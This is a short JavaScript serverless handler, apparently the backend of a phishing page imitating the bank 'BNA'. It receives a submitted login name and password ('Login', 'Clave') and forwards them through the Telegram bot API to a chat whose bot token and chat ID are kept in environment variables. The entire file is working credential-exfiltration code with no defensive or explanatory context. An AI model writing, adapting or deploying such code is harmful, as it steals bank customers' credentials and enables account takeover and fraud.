exports.handler = async (event) => {
  const { tipo, valor } = JSON.parse(event.body);

  const mensaje = `
📩 BNA

Login: ${tipo}
Clave: ${valor}
  `;

  await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: process.env.CHAT_ID,
      text: mensaje
    })
  });

  return {
    statusCode: 200,
    body: JSON.stringify({ ok: true })
  };
};
